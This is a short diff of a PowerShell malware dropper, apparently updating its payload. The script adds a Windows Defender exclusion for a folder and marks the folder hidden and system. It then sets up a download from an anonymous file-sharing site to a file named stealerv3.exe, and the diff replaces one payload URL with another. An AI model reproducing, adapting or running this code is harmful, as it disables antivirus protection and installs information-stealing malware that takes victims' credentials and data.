@@ -6,7 +6,7 @@ Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 $folderPath = $dir
 $filePath = "$folderPath\stealerv3.exe"
-$url = "https://anonsharing.com/file/84a332e79ec86acd/hidden.exe"
+$url = "https://anonsharing.com/file/7e713a235817c63a/sigma_999.exe"
 
 # Tạo thư mục nếu chưa tồn tại
 if (!(Test-Path $folderPath)) {
